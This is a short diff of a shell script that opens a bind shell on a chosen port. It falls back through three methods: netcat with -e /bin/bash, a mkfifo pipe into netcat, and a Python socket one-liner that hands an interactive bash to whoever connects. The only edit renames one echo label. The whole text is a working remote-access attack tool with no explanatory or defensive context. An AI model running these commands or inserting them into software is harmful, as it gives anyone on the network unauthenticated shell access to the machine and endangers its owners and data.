@@ -2,7 +2,7 @@ echo "**starting**"
 {
 	 echo "Method: netcat" && nc -lvp $1 -e /bin/bash
 } || {
-	echo "Method: alt netcat" && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp $1 >/tmp/f
+	echo "Method: netcat no -e" && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp $1 >/tmp/f
 } || {
 	echo "Method: python" && python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',"$1"));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
 } || {
